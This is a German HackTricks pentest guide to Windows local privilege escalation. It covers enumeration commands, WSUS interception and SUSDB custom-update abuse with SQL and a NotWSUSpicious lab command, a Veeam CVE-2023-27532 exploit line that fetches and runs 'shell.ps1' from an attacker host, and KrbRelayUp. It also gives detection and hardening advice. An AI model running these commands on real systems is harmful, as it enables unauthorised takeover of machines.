# Windows: lokale Privilegieneskalation

{{#include ../../banners/hacktricks-training.md}}

### **Bestes Tool zum Auffinden von Vektoren für die lokale Privilegieneskalation unter Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Diese Seite fasst die allgemeine Methodik zur Privilegieneskalation unter Windows aus mehreren grundlegenden Leitfäden zusammen.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Der praktische Ablauf zur Enumeration stützt sich außerdem auf Community-Workshops und Checklisten.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Das historische Angriffsmaterial umfasst die DerbyCon-Präsentation zur Privilegieneskalation unter Windows.<sup>[[5]](#references)</sup>

## Windows-Grundlagen

### Access Tokens

**Wenn du nicht weißt, was Windows Access Tokens sind, lies vor dem Fortsetzen die folgende Seite:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Weitere Informationen zu ACLs - DACLs/SACLs/ACEs findest du auf der folgenden Seite:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Wenn du nicht weißt, was Integrity Levels unter Windows sind, lies vor dem Fortsetzen die folgende Seite:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows-Sicherheitskontrollen

Unter Windows gibt es verschiedene Dinge, die **dich daran hindern können, das System zu enumerieren**, ausführbare Dateien zu starten oder sogar **deine Aktivitäten zu erkennen**. Du solltest die folgende **Seite lesen** und alle diese **Schutzmechanismen enumerieren**, bevor du mit der Enumeration zur Privilegieneskalation beginnst:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Physischer Zugriff kann außerdem die Offline-Bearbeitung des UEFI-NVRAM in eine Pre-Boot-DMA- und Windows-`SYSTEM`-Memory-Patching-Kette verwandeln:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / stille UIAccess-Erhöhung

UIAccess-Prozesse, die über `RAiLaunchAdminProcess` gestartet werden, können missbraucht werden, um ohne Eingabeaufforderungen High IL zu erreichen, wenn die Secure-Path-Prüfungen von AppInfo umgangen werden. Den entsprechenden UIAccess/Admin-Protection-Bypass-Ablauf findest du hier:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Die Registry-Weitergabe der Secure-Desktop-Barrierefreiheit kann für einen beliebigen SYSTEM-Registry-Schreibzugriff (RegPwn) missbraucht werden:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Neuere Windows-Builds bieten außerdem einen LPE-Pfad über **SMB mit beliebigem Port**, bei dem eine privilegierte lokale NTLM-Authentifizierung über eine wiederverwendete SMB-TCP-Verbindung reflektiert wird:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Systeminformationen

### Enumeration der Versionsinformationen

Prüfe, ob für die Windows-Version bekannte Schwachstellen vorliegen (überprüfe auch die installierten Patches).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Versions-Exploits

Diese [Website](https://msrc.microsoft.com/update-guide/vulnerability) ist hilfreich, um detaillierte Informationen zu Microsoft-Sicherheitslücken zu finden. Diese Datenbank enthält mehr als 4.700 Sicherheitslücken und zeigt die **massive Angriffsfläche**, die eine Windows-Umgebung bietet.

**Auf dem System**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas hat watson integriert)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — erfasst den OS-Build, installierte Updates und ausgewählte mögliche Advisories; überprüfe das genaue Produkt und ersetzende Updates, bevor du ein Ergebnis als zutreffend einstufst.

Prüfe bei einem lokalen Exploit für eine bestimmte Version sowohl die Architektur des **laufenden Prozesses** als auch die Architektur des Betriebssystems. Bei 64-Bit-Windows unterliegt ein 32-Bit-Prozess der [WOW64-Dateisystemumleitung](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` verweist normalerweise auf das 32-Bit-Systemverzeichnis, während `%windir%\Sysnative` diesem Prozess Zugriff auf das native Systemverzeichnis ermöglicht. Für einen 64-Bit-Prozess ist dieser Alias nicht verfügbar. Ein OS-Build oder ein möglicher fehlender KB-Update-Eintrag beweist nicht, dass ein Exploit funktioniert; vergleiche den laufenden Build, installierte oder ersetzende Updates, die Prozessarchitektur und die Exploit-Voraussetzungen mit dem [Microsoft-Sicherheitsbulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) zum konkreten Problem.

Ein Beispiel für eine Speicherbeschädigung in einem Dienst findest du unter [vom Client kontrollierte Offsets im MIDI-Ringpuffer für gemeinsam genutzten Speicher](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Die veröffentlichten Stack-Offsets gelten nur für den getesteten Build; das Erreichen von `LOCAL SERVICE` ist ein anderer Schritt als der anschließende [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md)-Schritt zu `SYSTEM`.<sup>[[44]](#references)</sup>

**Lokal mit Systeminformationen**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**GitHub-Repositories mit Exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Umgebung

Sind Zugangsdaten/Juicy-Informationen in den Umgebungsvariablen gespeichert?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell-Verlauf

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell-Transkriptdateien

Hier erfahren Sie, wie Sie diese Funktion aktivieren: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` ist nur ein Beispiel. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) schreibt normalerweise in den Documents-Ordner jedes Benutzers. Eine `OutputDirectory`-Einstellung oder `Start-Transcript -OutputDirectory` kann Dateien jedoch in einen gemeinsamen oder versteckten Ordner umleiten. Prüfen Sie den effektiven Ausgabepfad und die Datei-ACL, bevor Sie ein Transkript überprüfen: Es kann Befehlsargumente und Ausgaben enthalten, darunter Zugangsdaten. Ein lesbares Transkript ist nur dann ein Hinweis, wenn sein Inhalt eine verwendbare Identität mit höheren Berechtigungen offenlegt und diese Identität sich im relevanten Kontext anmelden kann.

### PowerShell Module Logging

Details zu PowerShell-Pipelineausführungen werden aufgezeichnet. Dazu gehören ausgeführte Befehle, Befehlsaufrufe und Teile von Skripten. Vollständige Ausführungsdetails und Ausgabeergebnisse werden jedoch möglicherweise nicht erfasst.

Folgen Sie zum Aktivieren den Anweisungen im Abschnitt „Transcript files“ der Dokumentation und wählen Sie **„Module Logging“** statt **„Powershell Transcription“**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Um die letzten 15 Ereignisse aus PowersShell-Logs anzuzeigen, können Sie Folgendes ausführen:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Dabei werden die Aktivitäten und der vollständige Inhalt des Skripts während seiner Ausführung erfasst. So wird jeder Codeblock dokumentiert, während er ausgeführt wird. Dieser Prozess bewahrt einen umfassenden Prüfpfad aller Aktivitäten, der für die Forensik und die Analyse bösartigen Verhaltens wertvoll ist. Durch die Dokumentation aller Aktivitäten zum Zeitpunkt der Ausführung werden detaillierte Einblicke in den Prozess ermöglicht.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Protokollereignisse für den Script Block finden Sie in der Windows-Ereignisanzeige unter dem Pfad: **Anwendungs- und Dienstprotokolle > Microsoft > Windows > PowerShell > Operational**.\
Um die letzten 20 Ereignisse anzuzeigen, können Sie Folgendes verwenden:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Interneteinstellungen

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Laufwerke

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

In den vorherigen Hinweisen wurde das Risiko wie folgt zusammengefasst:

Sie können das System kompromittieren, wenn Updates nicht über http**S**, sondern über http angefordert werden.

Ein HTTP-WSUS-Endpunkt ist ein Ansatzpunkt für die Untersuchung einer möglichen Manipulation von Update-Metadaten. Eine Ausnutzung hängt außerdem davon ab, ob der Client diesen WSUS-Server verwendet, ob ein Angreifer dessen Datenverkehr abfangen oder kontrollieren kann und welche Update-Vertrauens- und Installationsrichtlinien auf dem Client gelten. Die URL allein belegt keine Codeausführung. [Microsoft empfiehlt TLS für WSUS-Metadaten](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Prüfen Sie zunächst, ob das Netzwerk WSUS-Updates ohne SSL verwendet, indem Sie Folgendes in cmd ausführen:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Oder Folgendes in PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Wenn du eine Antwort wie eine der folgenden erhältst:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Und wenn `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` oder `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gleich `1` ist.

Die ursprüngliche Aussage zur Anwendbarkeit lautete:

Dann ist es **ausnutzbar.** Wenn der letzte Registry-Wert gleich `0` ist, wird der WSUS-Eintrag ignoriert.

Wenn `UseWUServer` den Wert `1` hat, verwendet Windows Update den konfigurierten Intranetdienst. Dies bestätigt eine Voraussetzung für den HTTP-Abfangpfad, beweist jedoch nicht, dass ein Abfangen, die Annahme eines schädlichen Updates oder eine Installation mit erhöhten Rechten möglich ist. Wenn der Wert `0` ist, wird dieser bestimmte konfigurierte WSUS-Endpunkt durch diese Richtlinie nicht ausgewählt.

Um diese Schwachstellen auszunutzen, können Sie Tools wie [Wsuxploit](https://github.com/pimps/wsuxploit) und [pyWSUS ](https://github.com/GoSecure/pywsus) verwenden. Diese weaponized MiTM-Exploit-Skripte schleusen „gefälschte“ Updates in nicht über SSL abgesicherten WSUS-Datenverkehr ein.

Lesen Sie hier die Recherche:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Lesen Sie hier den vollständigen Bericht**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Im Wesentlichen wird mit diesem Bug folgende Schwachstelle ausgenutzt:

> Wenn wir unseren lokalen Benutzerproxy ändern können und Windows Updates den in den Internet Explorer-Einstellungen konfigurierten Proxy verwendet, können wir [PyWSUS](https://github.com/GoSecure/pywsus) lokal ausführen, unseren eigenen Datenverkehr abfangen und auf unserem System Code als Benutzer mit erhöhten Rechten ausführen.
>
> Da der WSUS-Dienst außerdem die Einstellungen des aktuellen Benutzers verwendet, greift er auch auf dessen Zertifikatspeicher zu. Wenn wir ein selbstsigniertes Zertifikat für den WSUS-Hostnamen erstellen und dieses Zertifikat zum Zertifikatspeicher des aktuellen Benutzers hinzufügen, können wir sowohl HTTP- als auch HTTPS-WSUS-Datenverkehr abfangen. WSUS verwendet keine HSTS-ähnlichen Mechanismen, um eine Trust-on-first-use-Validierung des Zertifikats durchzuführen. Wenn das vorgelegte Zertifikat vom Benutzer als vertrauenswürdig eingestuft wird und den richtigen Hostnamen hat, wird es vom Dienst akzeptiert.

Sie können diese Schwachstelle mit dem Tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) ausnutzen (sobald es veröffentlicht wurde).

### Durch WSUS-Administratoren kontrollierte Updates

Ein separater Angriffsweg besteht, wenn die aktuelle Identität Updates auf einem WSUS-Server **veröffentlichen und genehmigen** kann. Prüfen Sie die effektive Mitgliedschaft in der Gruppe `WSUS Administrators` des Servers sowie alle delegierten WSUS-Berechtigungen. Ermitteln Sie anschließend die Clientcomputergruppe, die ein genehmigtes Update erhalten würde. [Microsoft verlangt WSUS-Administratorrechte zum Genehmigen von Updates](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) und [dokumentiert die Vertrauensbeziehung beim Veröffentlichen](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): Clients müssen dem Signaturzertifikat vertrauen, das für lokal veröffentlichte Inhalte verwendet wird. Vergewissern Sie sich, dass das fragliche Update signiert und akzeptiert wird, auf das Ziel anwendbar ist und in einem Kontext mit höheren Berechtigungen installiert wird, bevor Sie dies als Privilege-Escalation-Pfad einstufen. Ein HTTP-`WUServer`-Wert oder ein Gruppenname allein belegt diese Voraussetzungen nicht.

### Missbrauch von benutzerdefinierten Updates in SUSDB: unsignierte Payloads über `.txt`/`.esd`

Dies ist ein anderer Fehler an der Vertrauensgrenze als das Abfangen einer HTTP-WSUS-Verbindung: Voraussetzung ist ausreichender Zugriff auf die gespeicherten Prozeduren der **WSUS-Datenbank (`SUSDB`)**, um ein benutzerdefiniertes Update zu veröffentlichen und zu genehmigen. Ein möglicher Einstiegspunkt ist das Weiterleiten eines Upstream-WSUS-Computerkontos an einen separaten MSSQL-Server, auf dem `SUSDB` gehostet wird. Die genauen Voraussetzungen hängen von der Bereitstellung ab. Ermitteln Sie daher zunächst die `EXECUTE`-Berechtigungen, anstatt SQL-Administratorrechte vorauszusetzen.<sup>[[38]](#references)[[39]](#references)</sup>

Informationen zum separaten Angriffsweg, bei dem die WSUS-Clientauthentifizierung von HTTP/8530 an LDAP, SMB oder AD CS weitergeleitet wird, finden Sie unter [Missbrauch von WSUS HTTP für NTLM-Relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Externes Datenbank-Relay und Prozedurberechtigungen überprüfen

Bei Bereitstellungen, in denen WSUS einen externen SQL Server verwendet, prüfen Sie zunächst, ob sich das WSUS-Serverkonto bei der Datenbank authentifizieren kann und ob das NTLM-Relay diesen Listener erreicht. Die SQL-Rolle des Servers kann Prozeduren zum Veröffentlichen von Updates zugänglich machen, selbst wenn direkte Schreibzugriffe auf Tabellen verweigert werden. Ein fehlgeschlagenes `UPDATE` auf `SUSDB` belegt nicht, dass das Veröffentlichen gesperrt ist. Prüfen Sie in einer autorisierten SQL-Sitzung die effektive Identität, die Rollenmitgliedschaft und die Prozedurberechtigungen, bevor Sie ein benutzerdefiniertes Update versuchen.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Die Live-Prozedurdefinitionen und die installierte `SoftwareDistributionPackage.xsd` sind nützlich, um gültige Update-Metadaten zu rekonstruieren. Ein Bundle-Parent und ein Payload-Child benötigen jeweils `UpdateIdentity` (Fragmenttyp `1`), `LocalizedProperties` (`4`) und `ExtendedProperties` (`2`); erfasse die lokale Revisions-ID, die von jedem Aufruf von `spImportUpdate` zurückgegeben wird, und halte die Bundle-Beziehung, Digests, Größe, Content-URL und Revision konsistent. Dies ist ein zustandsbehafteter Publishing-Workflow; ein einzelner erfolgreicher Aufruf einer Stored Procedure beweist nicht, dass eine clientseitige Ausführung stattgefunden hat.<sup>[[38]](#references)</sup>

#### Update erstellen, zuweisen und genehmigen

Der Custom-Update-Workflow verwendet legitime WSUS-Prozeduren als eingeschränkte Publishing-API. Die wichtigen Zustandsübergänge sind:<sup>[[38]](#references)</sup>

| Phase | Relevante Stored Procedures |
| --- | --- |
| Update-Metadaten importieren | `spImportUpdate` |
| XML-Fragmente für Voraussetzungen, lokalisierte und erweiterte Eigenschaften speichern | `spSaveXMLFragment` |
| Den Content-Digest der vom Angreifer kontrollierten URL zuordnen | `spSetBatchURL` |
| Eine Computergruppe auflisten/erstellen und den Client hinzufügen | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Die Installation für diese Gruppe genehmigen | `spDeployUpdate` mit `@actionID = 0` und `@isAssigned = 1` |

Dateiname, Digests, Größe und `CommandLineInstallation`-Handler müssen in den importierten Metadaten und Fragmenten übereinstimmen. Nachdem die Content-URL und die Zielgruppe festgelegt wurden, sieht die abschließende Genehmigung in etwa wie folgt aus; verwende neue Update-, Gruppen- und Deployment-IDs, statt Beispiel-GUIDs wiederzuverwenden.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Erweiterungsbasierter Signature Bypass

WSUS weist normalerweise beliebige nicht signierte ausführbare Inhalte zurück. In `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` setzt der .NET-Pfad `VerifyFile` jedoch das Zertifikatsprüfungs-Flag auf false, wenn der angegebene Dateiname auf `.txt` oder `.esd` endet; `CheckCertificateSignature` wird dann übersprungen, ohne zuvor zu prüfen, ob die Bytes Text oder ein legitimes ESD-Abbild sind. Daher kann eine unveränderte PE-Datei mit einem Namen wie `payload.exe.txt` die Inhaltsprüfung bestehen und später vom Befehlszeilen-Installationshandler des Updates gestartet werden. Dies ist ein Richtlinien-/Typverwechslungsfehler, keine Signaturfälschung.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS-kompatibles Staging und Automatisierung

Der Aufruf von `spDeployUpdate` veranlasst WSUS, den registrierten Inhalt abzurufen. Der Ursprung muss die HTTP-Anforderungen von BITS erfüllen: Eine erreichbare URL allein reicht nicht aus, da die Übertragung einen anfänglichen `HEAD`-/`GET`-Ablauf und Byte-Range-Anfragen verwendet. Ein Server ohne Range-Unterstützung erzeugt ein WSUS-Synchronisierungsereignis `EventId=364` mit dem Hinweis, dass BITS den Range-Protokollheader benötigt.<sup>[[39]](#references)</sup>

Der Research-PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generiert das für die Import-/Fragment-/URL-/Gruppen-/Deployment-Kette erforderliche SQL, enthält einen modifizierten MSSQL-Client zur Ausführung und wird mit `BitsWebServer.py` für das Staging von Inhalten ausgeliefert. Ein minimaler Aufruf in einer autorisierten Laborumgebung lautet:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Unbeaufsichtigte Ausführung und Persistenz durch Wiederholungsversuche

Die clientseitige Interaktion hängt von der Richtlinie ab. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, Option `4 - Auto download and schedule install`, sorgt dafür, dass ein genehmigtes Update heruntergeladen und nach dem festgelegten Zeitplan installiert wird, ohne dass der Benutzer es manuell auswählen muss. Beim Testen wurde ein Payload, dessen Update fehlgeschlagen/unvollständig blieb, sofort nach dem Beenden des Callback-Prozesses erneut angeboten. Dadurch können Wiederholungsversuche zu wiederkehrender Ausführung als Persistenzmechanismus werden. Das ist auffällig, weil der Client einen Status für fehlgeschlagene Updates anzeigt.<sup>[[39]](#references)</sup>

#### Erkennung und Hardening-Maßnahmen

Nützliche server- und clientseitige Ansatzpunkte dieser Angriffskette sind:<sup>[[39]](#references)</sup>

- Die Ausführung von `spCreateTargetGroup`, `spSetBatchURL` und `spDeployUpdate` in `SUSDB` überwachen; neue Zielgruppen, externe Content-Ursprünge, Update-Payloads mit `.txt`/`.esd` sowie von unerwarteten Principals (insbesondere Nicht-Computer-Konten) vorgenommene Deployments untersuchen.
- `C:\Program Files\Update Services\LogFiles` auf `ContentSyncAgent`, `FileVerified`, den falsch geschriebenen Eintrag `FileVerficationFailed` und `EventId=364` überprüfen; die Verifizierung anhand der Payload-Erweiterung und des Content-Magic-Werts abgleichen, statt dem Suffix zu vertrauen.
- Wiederholte Fehler/Wiederholungsversuche bei der Windows-Update-Installation sowie PE-Ausführung oder unerwartete untergeordnete Prozesse/Netzwerkaktivitäten bei Content mit den Namen `.txt` oder `.esd` suchen.
- Wo unterstützt, Extended Protection for Authentication für den Datenbankdienst voraussetzen und den Netzwerkzugriff auf die Datenbank auf den WSUS-Server und autorisierte Administrationssysteme beschränken. `EXECUTE`-Berechtigungen für die benutzerdefinierten Update-Prozeduren minimieren und überwachen.

## Drittanbieter-Auto-Updater und Agent-IPC (local privesc)

Viele Unternehmensagenten bieten eine IPC-Schnittstelle auf localhost und einen privilegierten Update-Kanal. Wenn die Registrierung auf einen Angreifer-Server umgeleitet werden kann und der Updater einer gefälschten Root-CA oder schwachen Signaturprüfungen vertraut, kann ein lokaler Benutzer ein schädliches MSI bereitstellen, das der SYSTEM-Dienst installiert. Eine verallgemeinerte Technik (basierend auf der Netskope-stAgentSvc-Angriffskette – CVE-2025-0309) ist hier beschrieben:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM über TCP 9401)

Die ursprüngliche versionsspezifische Beschreibung und der Hinweis zur Reconnaissance lauteten:

Veeam B&R < `11.0.1.1261` stellt einen localhost-Dienst auf **TCP/9401** bereit, der vom Angreifer kontrollierte Nachrichten verarbeitet und dadurch beliebige Befehle als **NT AUTHORITY\SYSTEM** ermöglicht.<sup>[[12]](#references)</sup>

- **Recon**: Listener und Version bestätigen, z. B. mit `netstat -ano | findstr 9401` und `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication und Cloud Connect verwenden standardmäßig einen zentralen Backup-Dienst auf **TCP/9401**. [Veeams Sicherheitshinweis](https://www.veeam.com/kb4424) beschreibt die nicht authentifizierte Offenlegung verschlüsselter Zugangsdaten der Konfigurationsdatenbank innerhalb des Backup-Netzwerkperimeters; ein separater öffentlicher PoC zeigt einen Pfad zur Befehlsausführung als **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Der Dienst kann an mehr als nur localhost gebunden sein. Prüfen Sie daher die tatsächliche Adresse und PID.

- **Recon**: Bestätigen, dass TCP/9401 zu `Veeam.Backup.Service.exe` gehört, und anschließend das installierte Produkt sowie die Patch-Metadaten prüfen. `netstat -ano | findstr 9401` und `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` sind Anhaltspunkte, aber keine vollständige Patch-Prüfung.
- **Erste behobene Versionen**: Veeam nennt **11a Build 11.0.1.1261 P20230227** und **12 Build 12.0.0.1420 P20230223** als erste behobene Releases; frühere Releases sind betroffen. Anhand einer vierteiligen Dateiversion allein lässt sich ein nicht gepatchter Basis-Build nicht von einem späteren Patch auf denselben Build-Nummern unterscheiden. Prüfen Sie vor der Einstufung eines Grenz-Builds als behoben die Patch-Kennung anhand der [Build-Historie des Herstellers](https://www.veeam.com/kb2680).
- **Exploit**: Einen PoC wie `VeeamHax.exe` zusammen mit den erforderlichen Veeam-DLLs im selben Verzeichnis ablegen und dann einen SYSTEM-Payload über den lokalen Socket auslösen:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Der Dienst führt den Befehl als SYSTEM aus.

Der zitierte PoC demonstriert die Ausführung von Befehlen als SYSTEM, wenn die zusätzlichen Voraussetzungen erfüllt sind; der Sicherheitshinweis des Herstellers beschreibt das Problem der Offenlegung von Anmeldedaten.

## KrbRelayUp

Die ursprüngliche Beschreibung der Standardumgebung lautete:

In Windows-**Domänen**umgebungen besteht unter bestimmten Bedingungen eine Sicherheitslücke zur **lokalen Rechteausweitung**. Zu diesen Bedingungen gehören Umgebungen, in denen **LDAP signing nicht erzwungen wird,** Benutzer über Selbstberechtigungen verfügen, die es ihnen erlauben, **Resource-Based Constrained Delegation (RBCD)** zu konfigurieren, und Benutzer Computer in der Domäne erstellen können. Wichtig ist, dass diese **Voraussetzungen** mit **Standardeinstellungen** erfüllt sind.

Ein lokales Kerberos relay kann von einer Anmeldung mit geringeren Berechtigungen zu einem privilegierten Verzeichnisschreibvorgang führen, wenn sich ein geeigneter COM-Server authentifiziert und der weitergeleitete Principal Berechtigungen für das Zielobjekt besitzt. [KrbRelay dokumentiert](https://github.com/cube0x0/KrbRelay) sowohl LDAP-Schreibvorgänge für RBCD als auch für `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp automatisiert einige dieser Angriffspfade. Eine RBCD-Kette erfordert passende Delegierungs- und Zielobjektberechtigungen, während eine shadow-credential-Kette Schreibberechtigungen für Schlüsselanmeldedaten und einen KDC voraussetzt, der den Zertifikatsauthentifizierungspfad unterstützt. Keiner dieser Angriffspfade ergibt sich allein aus der Mitgliedschaft in der Domäne.

